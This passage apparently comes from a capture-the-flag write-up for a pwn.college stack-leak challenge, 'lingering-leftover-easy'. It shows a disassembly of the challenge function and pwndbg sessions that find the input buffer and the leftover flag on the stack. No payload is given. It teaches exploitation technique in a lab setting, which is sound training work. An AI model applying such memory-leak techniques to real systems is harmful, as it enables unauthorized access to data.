+   0x000000000000272e <+301>:   call   0x1130 <puts@plt>
+   0x0000000000002733 <+306>:   mov    rax,QWORD PTR [rip+0x3a4e]        # 0x6188 <sz_>
+   0x000000000000273a <+313>:   shl    rax,0x3
+   0x000000000000273e <+317>:   mov    rsi,rax
+   0x0000000000002741 <+320>:   lea    rdi,[rip+0xcfd]        # 0x3445
+   0x0000000000002748 <+327>:   mov    eax,0x0
+   0x000000000000274d <+332>:   call   0x1160 <printf@plt>
+   0x0000000000002752 <+337>:   mov    rax,QWORD PTR [rbp-0x208]
+   0x0000000000002759 <+344>:   mov    rsi,rax
+   0x000000000000275c <+347>:   lea    rdi,[rip+0xcfd]        # 0x3460
+   0x0000000000002763 <+354>:   mov    eax,0x0
+   0x0000000000002768 <+359>:   call   0x1160 <printf@plt>
+   0x000000000000276d <+364>:   lea    rdi,[rip+0xd34]        # 0x34a8
+   0x0000000000002774 <+371>:   call   0x1130 <puts@plt>
+   0x0000000000002779 <+376>:   lea    rdi,[rip+0xd78]        # 0x34f8
+   0x0000000000002780 <+383>:   call   0x1130 <puts@plt>
+   0x0000000000002785 <+388>:   mov    esi,0x1ea
+   0x000000000000278a <+393>:   lea    rdi,[rip+0xd97]        # 0x3528
+   0x0000000000002791 <+400>:   mov    eax,0x0
+   0x0000000000002796 <+405>:   call   0x1160 <printf@plt>
+   0x000000000000279b <+410>:   lea    rdi,[rip+0xdde]        # 0x3580
+   0x00000000000027a2 <+417>:   call   0x1130 <puts@plt>
+   0x00000000000027a7 <+422>:   lea    rdi,[rip+0xe0a]        # 0x35b8
+   0x00000000000027ae <+429>:   call   0x1130 <puts@plt>
+   0x00000000000027b3 <+434>:   lea    rdi,[rip+0xe2e]        # 0x35e8
+   0x00000000000027ba <+441>:   call   0x1130 <puts@plt>
+   0x00000000000027bf <+446>:   lea    rdi,[rip+0xe6a]        # 0x3630
+   0x00000000000027c6 <+453>:   call   0x1130 <puts@plt>
+   0x00000000000027cb <+458>:   mov    rdx,QWORD PTR [rip+0x39be]        # 0x6190 <rp_>
+   0x00000000000027d2 <+465>:   mov    rax,QWORD PTR [rbp-0x208]
+   0x00000000000027d9 <+472>:   sub    rdx,rax
+   0x00000000000027dc <+475>:   mov    rax,QWORD PTR [rip+0x39ad]        # 0x6190 <rp_>
+   0x00000000000027e3 <+482>:   mov    rsi,rax
+   0x00000000000027e6 <+485>:   lea    rdi,[rip+0xe8b]        # 0x3678
+   0x00000000000027ed <+492>:   mov    eax,0x0
+   0x00000000000027f2 <+497>:   call   0x1160 <printf@plt>
+   0x00000000000027f7 <+502>:   mov    rdx,QWORD PTR [rip+0x3992]        # 0x6190 <rp_>
+   0x00000000000027fe <+509>:   mov    rax,QWORD PTR [rbp-0x208]
+   0x0000000000002805 <+516>:   sub    rdx,rax
+   0x0000000000002808 <+519>:   mov    rax,rdx
+   0x000000000000280b <+522>:   add    rax,0x8
+   0x000000000000280f <+526>:   mov    edx,0x1ea
+   0x0000000000002814 <+531>:   mov    rsi,rax
+   0x0000000000002817 <+534>:   lea    rdi,[rip+0xea2]        # 0x36c0
+   0x000000000000281e <+541>:   mov    eax,0x0
+   0x0000000000002823 <+546>:   call   0x1160 <printf@plt>
+   0x0000000000002828 <+551>:   mov    rdx,QWORD PTR [rip+0x3961]        # 0x6190 <rp_>
+   0x000000000000282f <+558>:   mov    rax,QWORD PTR [rbp-0x208]
+   0x0000000000002836 <+565>:   sub    rdx,rax
+   0x0000000000002839 <+568>:   mov    rax,rdx
+   0x000000000000283c <+571>:   sub    rax,0x1ea
+   0x0000000000002842 <+577>:   mov    rsi,rax
+   0x0000000000002845 <+580>:   lea    rdi,[rip+0xecc]        # 0x3718
+   0x000000000000284c <+587>:   mov    eax,0x0
+   0x0000000000002851 <+592>:   call   0x1160 <printf@plt>
+   0x0000000000002856 <+597>:   lea    rdi,[rip+0xf0b]        # 0x3768
+   0x000000000000285d <+604>:   call   0x1130 <puts@plt>
+   0x0000000000002862 <+609>:   mov    rax,QWORD PTR [rip+0x390f]        # 0x6178 <bp_>
+   0x0000000000002869 <+616>:   mov    QWORD PTR [rip+0x3900],rax        # 0x6170 <cp_>
+   0x0000000000002870 <+623>:   mov    rax,QWORD PTR fs:0x28
+   0x0000000000002879 <+632>:   mov    QWORD PTR [rip+0x3900],rax        # 0x6180 <cv_>
+   0x0000000000002880 <+639>:   jmp    0x2894 <challenge+659>
+   0x0000000000002882 <+641>:   mov    rax,QWORD PTR [rip+0x38e7]        # 0x6170 <cp_>
+   0x0000000000002889 <+648>:   sub    rax,0x8
+   0x000000000000288d <+652>:   mov    QWORD PTR [rip+0x38dc],rax        # 0x6170 <cp_>
+   0x0000000000002894 <+659>:   mov    rax,QWORD PTR [rip+0x38d5]        # 0x6170 <cp_>
+   0x000000000000289b <+666>:   mov    rdx,QWORD PTR [rax]
+   0x000000000000289e <+669>:   mov    rax,QWORD PTR [rip+0x38db]        # 0x6180 <cv_>
+   0x00000000000028a5 <+676>:   cmp    rdx,rax
+   0x00000000000028a8 <+679>:   jne    0x2882 <challenge+641>
+   0x00000000000028aa <+681>:   lea    rdi,[rip+0xee7]        # 0x3798
+   0x00000000000028b1 <+688>:   call   0x1130 <puts@plt>
+   0x00000000000028b6 <+693>:   lea    rdi,[rip+0xf1b]        # 0x37d8
+   0x00000000000028bd <+700>:   call   0x1130 <puts@plt>
+   0x00000000000028c2 <+705>:   lea    rdi,[rip+0xf47]        # 0x3810
+   0x00000000000028c9 <+712>:   call   0x1130 <puts@plt>
+   0x00000000000028ce <+717>:   lea    rdi,[rip+0xf8c]        # 0x3861
+   0x00000000000028d5 <+724>:   mov    eax,0x0
+   0x00000000000028da <+729>:   call   0x1160 <printf@plt>
+   0x00000000000028df <+734>:   lea    rax,[rbp-0x210]
+   0x00000000000028e6 <+741>:   mov    rsi,rax
+   0x00000000000028e9 <+744>:   lea    rdi,[rip+0xf80]        # 0x3870
+   0x00000000000028f0 <+751>:   mov    eax,0x0
+   0x00000000000028f5 <+756>:   call   0x11b0 <__isoc99_scanf@plt>
+   0x00000000000028fa <+761>:   mov    rax,QWORD PTR [rbp-0x210]
+   0x0000000000002901 <+768>:   mov    rsi,rax
+   0x0000000000002904 <+771>:   lea    rdi,[rip+0xf6d]        # 0x3878
+   0x000000000000290b <+778>:   mov    eax,0x0
+   0x0000000000002910 <+783>:   call   0x1160 <printf@plt>
+   0x0000000000002915 <+788>:   mov    rax,QWORD PTR [rbp-0x208]
+   0x000000000000291c <+795>:   mov    rsi,rax
+   0x000000000000291f <+798>:   lea    rdi,[rip+0xf82]        # 0x38a8
+   0x0000000000002926 <+805>:   mov    eax,0x0
+   0x000000000000292b <+810>:   call   0x1160 <printf@plt>
+   0x0000000000002930 <+815>:   mov    rax,QWORD PTR [rbp-0x210]
+   0x0000000000002937 <+822>:   lea    rdx,[rax-0x1ea]
+   0x000000000000293e <+829>:   mov    rcx,QWORD PTR [rbp-0x210]
+   0x0000000000002945 <+836>:   mov    rax,QWORD PTR [rbp-0x208]
+   0x000000000000294c <+843>:   add    rax,rcx
+   0x000000000000294f <+846>:   mov    rsi,rax
+   0x0000000000002952 <+849>:   lea    rdi,[rip+0xf97]        # 0x38f0
+   0x0000000000002959 <+856>:   mov    eax,0x0
+   0x000000000000295e <+861>:   call   0x1160 <printf@plt>
+   0x0000000000002963 <+866>:   mov    rdx,QWORD PTR [rbp-0x208]
+   0x000000000000296a <+873>:   mov    rax,QWORD PTR [rbp-0x210]
+   0x0000000000002971 <+880>:   add    rdx,rax
+   0x0000000000002974 <+883>:   mov    rax,QWORD PTR [rip+0x3815]        # 0x6190 <rp_>
+   0x000000000000297b <+890>:   sub    rdx,rax
+   0x000000000000297e <+893>:   mov    rax,rdx
+   0x0000000000002981 <+896>:   mov    rsi,rax
+   0x0000000000002984 <+899>:   lea    rdi,[rip+0xfbd]        # 0x3948
+   0x000000000000298b <+906>:   mov    eax,0x0
+   0x0000000000002990 <+911>:   call   0x1160 <printf@plt>
+   0x0000000000002995 <+916>:   lea    rdi,[rip+0xfec]        # 0x3988
+   0x000000000000299c <+923>:   call   0x1130 <puts@plt>
+   0x00000000000029a1 <+928>:   lea    rdi,[rip+0x1038]        # 0x39e0
+   0x00000000000029a8 <+935>:   call   0x1130 <puts@plt>
+   0x00000000000029ad <+940>:   lea    rdi,[rip+0x106c]        # 0x3a20
+   0x00000000000029b4 <+947>:   call   0x1130 <puts@plt>
+   0x00000000000029b9 <+952>:   lea    rdi,[rip+0x10b0]        # 0x3a70
+   0x00000000000029c0 <+959>:   call   0x1130 <puts@plt>
+   0x00000000000029c5 <+964>:   lea    rdi,[rip+0x10ec]        # 0x3ab8
+   0x00000000000029cc <+971>:   call   0x1130 <puts@plt>
+   0x00000000000029d1 <+976>:   lea    rdi,[rip+0x1128]        # 0x3b00
+   0x00000000000029d8 <+983>:   call   0x1130 <puts@plt>
+   0x00000000000029dd <+988>:   lea    rdi,[rip+0x116c]        # 0x3b50
+   0x00000000000029e4 <+995>:   call   0x1130 <puts@plt>
+   0x00000000000029e9 <+1000>:  lea    rdi,[rip+0x11b8]        # 0x3ba8
+   0x00000000000029f0 <+1007>:  call   0x1130 <puts@plt>
+   0x00000000000029f5 <+1012>:  lea    rdi,[rip+0x11fe]        # 0x3bfa
+   0x00000000000029fc <+1019>:  call   0x1130 <puts@plt>
+   0x0000000000002a01 <+1024>:  lea    rdi,[rip+0x1210]        # 0x3c18
+   0x0000000000002a08 <+1031>:  call   0x1130 <puts@plt>
+   0x0000000000002a0d <+1036>:  lea    rdi,[rip+0x1254]        # 0x3c68
+   0x0000000000002a14 <+1043>:  call   0x1130 <puts@plt>
+   0x0000000000002a19 <+1048>:  lea    rdi,[rip+0x1298]        # 0x3cb8
+   0x0000000000002a20 <+1055>:  call   0x1130 <puts@plt>
+   0x0000000000002a25 <+1060>:  lea    rdi,[rip+0x12d7]        # 0x3d03
+   0x0000000000002a2c <+1067>:  call   0x1130 <puts@plt>
+   0x0000000000002a31 <+1072>:  lea    rdi,[rip+0x12e8]        # 0x3d20
+   0x0000000000002a38 <+1079>:  call   0x1130 <puts@plt>
+   0x0000000000002a3d <+1084>:  lea    rdi,[rip+0x1324]        # 0x3d68
+   0x0000000000002a44 <+1091>:  call   0x1130 <puts@plt>
+   0x0000000000002a49 <+1096>:  lea    rdi,[rip+0x1368]        # 0x3db8
+   0x0000000000002a50 <+1103>:  call   0x1130 <puts@plt>
+   0x0000000000002a55 <+1108>:  lea    rdi,[rip+0x13ac]        # 0x3e08
+   0x0000000000002a5c <+1115>:  call   0x1130 <puts@plt>
+   0x0000000000002a61 <+1120>:  lea    rdi,[rip+0x13e8]        # 0x3e50
+   0x0000000000002a68 <+1127>:  call   0x1130 <puts@plt>
+   0x0000000000002a6d <+1132>:  lea    rdi,[rip+0x141c]        # 0x3e90
+   0x0000000000002a74 <+1139>:  call   0x1130 <puts@plt>
+   0x0000000000002a79 <+1144>:  lea    rdi,[rip+0x142f]        # 0x3eaf
+   0x0000000000002a80 <+1151>:  call   0x1130 <puts@plt>
+   0x0000000000002a85 <+1156>:  lea    rdi,[rip+0x142c]        # 0x3eb8
+   0x0000000000002a8c <+1163>:  call   0x1130 <puts@plt>
+   0x0000000000002a91 <+1168>:  lea    rdi,[rip+0x1448]        # 0x3ee0
+   0x0000000000002a98 <+1175>:  call   0x1130 <puts@plt>
+   0x0000000000002a9d <+1180>:  lea    rdi,[rip+0x146c]        # 0x3f10
+   0x0000000000002aa4 <+1187>:  call   0x1130 <puts@plt>
+   0x0000000000002aa9 <+1192>:  lea    rdi,[rip+0x148d]        # 0x3f3d
+   0x0000000000002ab0 <+1199>:  call   0x1130 <puts@plt>
+   0x0000000000002ab5 <+1204>:  lea    rdi,[rip+0x1491]        # 0x3f4d
+   0x0000000000002abc <+1211>:  call   0x1130 <puts@plt>
+   0x0000000000002ac1 <+1216>:  lea    rdi,[rip+0x85c]        # 0x3324
+   0x0000000000002ac8 <+1223>:  call   0x1130 <puts@plt>
+   0x0000000000002acd <+1228>:  lea    rdi,[rip+0x1484]        # 0x3f58
+   0x0000000000002ad4 <+1235>:  call   0x1130 <puts@plt>
+   0x0000000000002ad9 <+1240>:  lea    rdi,[rip+0x14c8]        # 0x3fa8
+   0x0000000000002ae0 <+1247>:  call   0x1130 <puts@plt>
+   0x0000000000002ae5 <+1252>:  lea    rdi,[rip+0x150c]        # 0x3ff8
+   0x0000000000002aec <+1259>:  call   0x1130 <puts@plt>
+   0x0000000000002af1 <+1264>:  lea    rdi,[rip+0x1550]        # 0x4048
+   0x0000000000002af8 <+1271>:  call   0x1130 <puts@plt>
+   0x0000000000002afd <+1276>:  lea    rdi,[rip+0x1584]        # 0x4088
+   0x0000000000002b04 <+1283>:  call   0x1130 <puts@plt>
+   0x0000000000002b09 <+1288>:  lea    rdi,[rip+0x15c8]        # 0x40d8
+   0x0000000000002b10 <+1295>:  call   0x1130 <puts@plt>
+   0x0000000000002b15 <+1300>:  lea    rdi,[rip+0x1614]        # 0x4130
+   0x0000000000002b1c <+1307>:  call   0x1130 <puts@plt>
+   0x0000000000002b21 <+1312>:  lea    rdi,[rip+0x1640]        # 0x4168
+   0x0000000000002b28 <+1319>:  call   0x1130 <puts@plt>
+   0x0000000000002b2d <+1324>:  mov    rdx,QWORD PTR [rip+0x365c]        # 0x6190 <rp_>
+   0x0000000000002b34 <+1331>:  mov    rax,QWORD PTR [rbp-0x208]
+   0x0000000000002b3b <+1338>:  sub    rdx,rax
+   0x0000000000002b3e <+1341>:  mov    rax,QWORD PTR [rip+0x364b]        # 0x6190 <rp_>
+   0x0000000000002b45 <+1348>:  mov    rsi,rax
+   0x0000000000002b48 <+1351>:  lea    rdi,[rip+0x1669]        # 0x41b8
+   0x0000000000002b4f <+1358>:  mov    eax,0x0
+   0x0000000000002b54 <+1363>:  call   0x1160 <printf@plt>
+   0x0000000000002b59 <+1368>:  lea    rdi,[rip+0x16a8]        # 0x4208
+   0x0000000000002b60 <+1375>:  call   0x1130 <puts@plt>
+   0x0000000000002b65 <+1380>:  mov    rax,QWORD PTR [rbp-0x210]
+   0x0000000000002b6c <+1387>:  mov    rsi,rax
+   0x0000000000002b6f <+1390>:  lea    rdi,[rip+0x16b2]        # 0x4228
+   0x0000000000002b76 <+1397>:  mov    eax,0x0
+   0x0000000000002b7b <+1402>:  call   0x1160 <printf@plt>
+   0x0000000000002b80 <+1407>:  mov    rdx,QWORD PTR [rbp-0x210]
+   0x0000000000002b87 <+1414>:  mov    rax,QWORD PTR [rbp-0x208]
+   0x0000000000002b8e <+1421>:  mov    rsi,rax
+   0x0000000000002b91 <+1424>:  mov    edi,0x0
+   0x0000000000002b96 <+1429>:  call   0x1180 <read@plt>
+   0x0000000000002b9b <+1434>:  mov    DWORD PTR [rbp-0x214],eax
+   0x0000000000002ba1 <+1440>:  cmp    DWORD PTR [rbp-0x214],0x0
+   0x0000000000002ba8 <+1447>:  jns    0x2bd6 <challenge+1493>
+   0x0000000000002baa <+1449>:  call   0x1120 <__errno_location@plt>
+   0x0000000000002baf <+1454>:  mov    eax,DWORD PTR [rax]
+   0x0000000000002bb1 <+1456>:  mov    edi,eax
+   0x0000000000002bb3 <+1458>:  call   0x11d0 <strerror@plt>
+   0x0000000000002bb8 <+1463>:  mov    rsi,rax
+   0x0000000000002bbb <+1466>:  lea    rdi,[rip+0x168e]        # 0x4250
+   0x0000000000002bc2 <+1473>:  mov    eax,0x0
+   0x0000000000002bc7 <+1478>:  call   0x1160 <printf@plt>
+   0x0000000000002bcc <+1483>:  mov    edi,0x1
+   0x0000000000002bd1 <+1488>:  call   0x11c0 <exit@plt>
+   0x0000000000002bd6 <+1493>:  mov    eax,DWORD PTR [rbp-0x214]
+   0x0000000000002bdc <+1499>:  mov    esi,eax
+   0x0000000000002bde <+1501>:  lea    rdi,[rip+0x168f]        # 0x4274
+   0x0000000000002be5 <+1508>:  mov    eax,0x0
+   0x0000000000002bea <+1513>:  call   0x1160 <printf@plt>
+   0x0000000000002bef <+1518>:  lea    rdi,[rip+0x1692]        # 0x4288
+   0x0000000000002bf6 <+1525>:  call   0x1130 <puts@plt>
+   0x0000000000002bfb <+1530>:  mov    rdx,QWORD PTR [rip+0x3586]        # 0x6188 <sz_>
+   0x0000000000002c02 <+1537>:  mov    rax,QWORD PTR [rip+0x358f]        # 0x6198 <sp_>
+   0x0000000000002c09 <+1544>:  mov    rsi,rdx
+   0x0000000000002c0c <+1547>:  mov    rdi,rax
+   0x0000000000002c0f <+1550>:  call   0x12c9 <DUMP_STACK>
+   0x0000000000002c14 <+1555>:  lea    rdi,[rip+0x1696]        # 0x42b1
+   0x0000000000002c1b <+1562>:  call   0x1130 <puts@plt>
+   0x0000000000002c20 <+1567>:  mov    rax,QWORD PTR [rbp-0x208]
+   0x0000000000002c27 <+1574>:  mov    rsi,rax
+   0x0000000000002c2a <+1577>:  lea    rdi,[rip+0x169f]        # 0x42d0
+   0x0000000000002c31 <+1584>:  mov    eax,0x0
+   0x0000000000002c36 <+1589>:  call   0x1160 <printf@plt>
+   0x0000000000002c3b <+1594>:  mov    rax,QWORD PTR [rip+0x3536]        # 0x6178 <bp_>
+   0x0000000000002c42 <+1601>:  mov    rsi,rax
+   0x0000000000002c45 <+1604>:  lea    rdi,[rip+0x16ac]        # 0x42f8
+   0x0000000000002c4c <+1611>:  mov    eax,0x0
+   0x0000000000002c51 <+1616>:  call   0x1160 <printf@plt>
+   0x0000000000002c56 <+1621>:  mov    rax,QWORD PTR [rip+0x3533]        # 0x6190 <rp_>
+   0x0000000000002c5d <+1628>:  mov    rsi,rax
+   0x0000000000002c60 <+1631>:  lea    rdi,[rip+0x16c1]        # 0x4328
+   0x0000000000002c67 <+1638>:  mov    eax,0x0
+   0x0000000000002c6c <+1643>:  call   0x1160 <printf@plt>
+   0x0000000000002c71 <+1648>:  mov    rax,QWORD PTR [rip+0x3518]        # 0x6190 <rp_>
+   0x0000000000002c78 <+1655>:  mov    rax,QWORD PTR [rax]
+   0x0000000000002c7b <+1658>:  mov    rsi,rax
+   0x0000000000002c7e <+1661>:  lea    rdi,[rip+0x16e3]        # 0x4368
+   0x0000000000002c85 <+1668>:  mov    eax,0x0
+   0x0000000000002c8a <+1673>:  call   0x1160 <printf@plt>
+   0x0000000000002c8f <+1678>:  mov    rax,QWORD PTR [rip+0x34da]        # 0x6170 <cp_>
+   0x0000000000002c96 <+1685>:  mov    rsi,rax
+   0x0000000000002c99 <+1688>:  lea    rdi,[rip+0x1700]        # 0x43a0
+   0x0000000000002ca0 <+1695>:  mov    eax,0x0
+   0x0000000000002ca5 <+1700>:  call   0x1160 <printf@plt>
+   0x0000000000002caa <+1705>:  mov    rax,QWORD PTR [rip+0x34bf]        # 0x6170 <cp_>
+   0x0000000000002cb1 <+1712>:  mov    rax,QWORD PTR [rax]
+   0x0000000000002cb4 <+1715>:  mov    rsi,rax
+   0x0000000000002cb7 <+1718>:  lea    rdi,[rip+0x1702]        # 0x43c0
+   0x0000000000002cbe <+1725>:  mov    eax,0x0
+   0x0000000000002cc3 <+1730>:  call   0x1160 <printf@plt>
+   0x0000000000002cc8 <+1735>:  lea    rsi,[rip+0xfffffffffffff783]        # 0x2452 <win_authed>
+   0x0000000000002ccf <+1742>:  lea    rdi,[rip+0x170a]        # 0x43e0
+   0x0000000000002cd6 <+1749>:  mov    eax,0x0
+   0x0000000000002cdb <+1754>:  call   0x1160 <printf@plt>
+   0x0000000000002ce0 <+1759>:  mov    edi,0xa
+   0x0000000000002ce5 <+1764>:  call   0x1110 <putchar@plt>
+   0x0000000000002cea <+1769>:  lea    rdi,[rip+0x1717]        # 0x4408
+   0x0000000000002cf1 <+1776>:  call   0x1130 <puts@plt>
+   0x0000000000002cf6 <+1781>:  lea    rdi,[rip+0x175b]        # 0x4458
+   0x0000000000002cfd <+1788>:  call   0x1130 <puts@plt>
+   0x0000000000002d02 <+1793>:  mov    esi,0x0
+   0x0000000000002d07 <+1798>:  lea    rdi,[rip+0x178a]        # 0x4498
+   0x0000000000002d0e <+1805>:  mov    eax,0x0
+   0x0000000000002d13 <+1810>:  call   0x1160 <printf@plt>
+   0x0000000000002d18 <+1815>:  mov    eax,DWORD PTR [rbp-0x214]
+   0x0000000000002d1e <+1821>:  movsxd rdx,eax
+   0x0000000000002d21 <+1824>:  mov    rax,QWORD PTR [rbp-0x208]
+   0x0000000000002d28 <+1831>:  add    rdx,rax
+   0x0000000000002d2b <+1834>:  mov    rax,QWORD PTR [rip+0x345e]        # 0x6190 <rp_>
+   0x0000000000002d32 <+1841>:  add    rax,0x2
+   0x0000000000002d36 <+1845>:  cmp    rdx,rax
+   0x0000000000002d39 <+1848>:  jbe    0x2d77 <challenge+1910>
+   0x0000000000002d3b <+1850>:  lea    rdi,[rip+0x176e]        # 0x44b0
+   0x0000000000002d42 <+1857>:  call   0x1130 <puts@plt>
+   0x0000000000002d47 <+1862>:  lea    rdi,[rip+0x17ba]        # 0x4508
+   0x0000000000002d4e <+1869>:  call   0x1130 <puts@plt>
+   0x0000000000002d53 <+1874>:  lea    rdi,[rip+0x17fe]        # 0x4558
+   0x0000000000002d5a <+1881>:  call   0x1130 <puts@plt>
+   0x0000000000002d5f <+1886>:  lea    rdi,[rip+0x183a]        # 0x45a0
+   0x0000000000002d66 <+1893>:  call   0x1130 <puts@plt>
+   0x0000000000002d6b <+1898>:  lea    rdi,[rip+0x1873]        # 0x45e5
+   0x0000000000002d72 <+1905>:  call   0x1130 <puts@plt>
+   0x0000000000002d77 <+1910>:  mov    rax,QWORD PTR [rbp-0x208]
+   0x0000000000002d7e <+1917>:  mov    rsi,rax
+   0x0000000000002d81 <+1920>:  lea    rdi,[rip+0x1867]        # 0x45ef
+   0x0000000000002d88 <+1927>:  mov    eax,0x0
+   0x0000000000002d8d <+1932>:  call   0x1160 <printf@plt>
+   0x0000000000002d92 <+1937>:  lea    rdi,[rip+0x1868]        # 0x4601
+   0x0000000000002d99 <+1944>:  call   0x1130 <puts@plt>
+   0x0000000000002d9e <+1949>:  mov    eax,0x0
+   0x0000000000002da3 <+1954>:  mov    rcx,QWORD PTR [rbp-0x8]
+   0x0000000000002da7 <+1958>:  xor    rcx,QWORD PTR fs:0x28
+   0x0000000000002db0 <+1967>:  je     0x2db7 <challenge+1974>
+   0x0000000000002db2 <+1969>:  call   0x1150 <__stack_chk_fail@plt>
+   0x0000000000002db7 <+1974>:  leave
+   0x0000000000002db8 <+1975>:  ret
+End of assembler dump.
+```
+
+```
+   0x0000000000002b80 <+1407>:  mov    rdx,QWORD PTR [rbp-0x210]
+   0x0000000000002b87 <+1414>:  mov    rax,QWORD PTR [rbp-0x208]
+   0x0000000000002b8e <+1421>:  mov    rsi,rax
+   0x0000000000002b91 <+1424>:  mov    edi,0x0
+   0x0000000000002b96 <+1429>:  call   0x1180 <read@plt>
+```
+
+Let's set another breakpoint at `challenge+1429` in order to get the location of our buffer.
+
+```
+pwndbg> break *(challenge+1429)
+Breakpoint 2 at 0x2b96
+```
+
+```
+pwndbg> run
+Starting program: /challenge/lingering-leftover-easy 
+###
+### Welcome to /challenge/lingering-leftover-easy!
+###
+
+
+Breakpoint 1, 0x000057856777c5ba in verify_flag ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+─────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────────────────────────────
+ RAX  0x7ffe5dbd2e96 ◂— 0x57856777cec00000
+ RBX  0x57856777cec0 (__libc_csu_init) ◂— endbr64 
+ RCX  0xffffffff
+ RDX  0x100
+ RDI  0xffffffff
+ RSI  0x7ffe5dbd2e96 ◂— 0x57856777cec00000
+ R8   0xa
+ R9   0x33
+ R10  0
+ R11  0x246
+ R12  0x57856777b1e0 (_start) ◂— endbr64 
+ R13  0x7ffe5dbd40d0 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffe5dbd2fa0 —▸ 0x7ffe5dbd3fe0 ◂— 0
+ RSP  0x7ffe5dbd2e40 ◂— 0
+ RIP  0x57856777c5ba (verify_flag+75) ◂— call read@plt
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x57856777c5ba <verify_flag+75>     call   read@plt                    <read@plt>
+        fd: 0xffffffff
+        buf: 0x7ffe5dbd2e96 ◂— 0x57856777cec00000
+        nbytes: 0x100
+ 
+   0x57856777c5bf <verify_flag+80>     lea    rdi, [rip + 0xc32]     RDI => 0x57856777d1f8 ◂— 'This challenge reads the flag file to verify it. D...'
+   0x57856777c5c6 <verify_flag+87>     call   puts@plt                    <puts@plt>
+ 
+   0x57856777c5cb <verify_flag+92>     lea    rax, [rbp - 0x160]
+   0x57856777c5d2 <verify_flag+99>     add    rax, 0x56
+   0x57856777c5d6 <verify_flag+103>    mov    rsi, rax
+   0x57856777c5d9 <verify_flag+106>    lea    rdi, [rip + 0xc90]     RDI => 0x57856777d270 ◂— 'The flag was read into address %p.\n\n'
+   0x57856777c5e0 <verify_flag+113>    mov    eax, 0                 EAX => 0
+   0x57856777c5e5 <verify_flag+118>    call   printf@plt                  <printf@plt>
+ 
+   0x57856777c5ea <verify_flag+123>    nop    
+   0x57856777c5eb <verify_flag+124>    mov    rdx, qword ptr [rbp - 8]
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7ffe5dbd2e40 ◂— 0
+... ↓        6 skipped
+07:0038│-128 0x7ffe5dbd2e78 —▸ 0x7d6e79f7b193 (_dl_add_to_namespace_list+35) ◂— lea rdx, [rbx + rbx*8]
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x57856777c5ba verify_flag+75
+   1   0x57856777ce7a main+193
+   2   0x7d6e79d90083 __libc_start_main+243
+   3   0x57856777b20e _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [ ] Location of buffer
+- [x] Location of the flag in the stack: `0x7ffe5dbd2e96`
+
+```
+pwndbg> c
+Continuing.
+
+# ---- snip ----
+
+Payload size: 2
+
+# ---- snip ----
+
+Breakpoint 2, 0x000057856777cb96 in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+─────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────────────────────────────
+*RAX  0x7ffe5dbd2da0 ◂— 0x76 /* 'v' */
+ RBX  0x57856777cec0 (__libc_csu_init) ◂— endbr64 
+*RCX  0
+*RDX  2
+*RDI  0
+*RSI  0x7ffe5dbd2da0 ◂— 0x76 /* 'v' */
+*R8   0x23
+*R9   0x23
+*R10  0x57856777e244 ◂— ' bytes)!\n'
+ R11  0x246
+ R12  0x57856777b1e0 (_start) ◂— endbr64 
+ R13  0x7ffe5dbd40d0 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffe5dbd2fa0 —▸ 0x7ffe5dbd3fe0 ◂— 0
+*RSP  0x7ffe5dbd2d60 ◂— 0x3000000010
+*RIP  0x57856777cb96 (challenge+1429) ◂— call read@plt
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x57856777cb96 <challenge+1429>    call   read@plt                    <read@plt>
+        fd: 0 (/dev/pts/1)
+        buf: 0x7ffe5dbd2da0 ◂— 0x76 /* 'v' */
+        nbytes: 2
+ 
+   0x57856777cb9b <challenge+1434>    mov    dword ptr [rbp - 0x214], eax
+   0x57856777cba1 <challenge+1440>    cmp    dword ptr [rbp - 0x214], 0
+   0x57856777cba8 <challenge+1447>    jns    challenge+1493              <challenge+1493>
+ 
+   0x57856777cbaa <challenge+1449>    call   __errno_location@plt        <__errno_location@plt>
+ 
+   0x57856777cbaf <challenge+1454>    mov    eax, dword ptr [rax]
+   0x57856777cbb1 <challenge+1456>    mov    edi, eax
+   0x57856777cbb3 <challenge+1458>    call   strerror@plt                <strerror@plt>
+ 
+   0x57856777cbb8 <challenge+1463>    mov    rsi, rax
+   0x57856777cbbb <challenge+1466>    lea    rdi, [rip + 0x168e]     RDI => 0x57856777e250 ◂— 'ERROR: Failed to read input -- %s!\n'
+   0x57856777cbc2 <challenge+1473>    mov    eax, 0                  EAX => 0
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7ffe5dbd2d60 ◂— 0x3000000010
+01:0008│-238 0x7ffe5dbd2d68 —▸ 0x7ffe5dbd40e8 —▸ 0x7ffe5dbd468e ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-230 0x7ffe5dbd2d70 —▸ 0x7ffe5dbd40d8 —▸ 0x7ffe5dbd466b ◂— '/challenge/lingering-leftover-easy'
+03:0018│-228 0x7ffe5dbd2d78 ◂— 0x11c890400
+04:0020│-220 0x7ffe5dbd2d80 ◂— 0
+05:0028│-218 0x7ffe5dbd2d88 —▸ 0x7ffe5dbd2e96 ◂— 0x57856777cec00000
+06:0030│-210 0x7ffe5dbd2d90 ◂— 2
+07:0038│-208 0x7ffe5dbd2d98 —▸ 0x7ffe5dbd2da0 ◂— 0x76 /* 'v' */
